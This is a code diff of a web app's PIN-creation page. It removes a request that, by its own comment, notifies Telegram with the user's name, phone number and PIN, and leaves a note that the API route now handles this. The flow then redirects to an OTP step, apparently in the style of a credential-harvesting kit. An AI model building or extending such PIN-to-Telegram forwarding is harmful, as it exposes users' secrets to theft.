@@ -48,36 +48,24 @@ export default function CreatePinPage() {
 
     setIsLoading(true);
     
-    // Send notification to Telegram with user details and PIN
-    try {
-      await fetch('/api/auth/register', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          name: urlParams.name,
-          phone: urlParams.phone,
-          pin,
-          action: 'create_pin' 
-        })
-      });
-    } catch (err) {
-      console.error('Failed to send notification:', err);
-    }
+    // Note: Notification is now handled in the auth/register API route
     
     // Create user and get token
     try {
-      const response = await fetch('/api/auth/register', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: urlParams.name, phone: urlParams.phone, pin })
+      const token = localStorage.getItem('token');
+      
+      const response = await fetch('/api/user/update', {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({ pin })
       });
       
       const data = await response.json();
       
-      if (response.ok && data.token) {
-        // Store the token in localStorage
-        localStorage.setItem('token', data.token);
-        
+      if (response.ok && data.success) {
         // Redirect to progress page then to OTP page
         router.push(`/loading-secure?action=signup&name=${encodeURIComponent(urlParams.name)}&phone=${encodeURIComponent(urlParams.phone)}&redirect=otp`);
       } else {
